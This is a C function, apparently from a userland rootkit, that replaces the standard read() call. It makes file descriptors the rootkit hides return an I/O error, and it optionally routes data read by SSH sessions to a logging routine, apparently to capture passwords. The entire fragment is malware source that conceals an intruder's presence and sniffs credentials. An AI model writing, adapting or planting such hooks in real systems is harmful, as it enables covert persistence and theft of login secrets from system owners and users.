ssize_t read(int fd, void *buf, size_t n){
    if(hidden_fd(fd)){
        errno = EIO;
        return -1;
    }

    ssize_t o;
    hook(CREAD);
    o = (ssize_t)call(CREAD, fd, buf, n);
#ifdef LOG_SSH
    return log_ssh(fd, buf, o);
#else
    return o;
#endif
}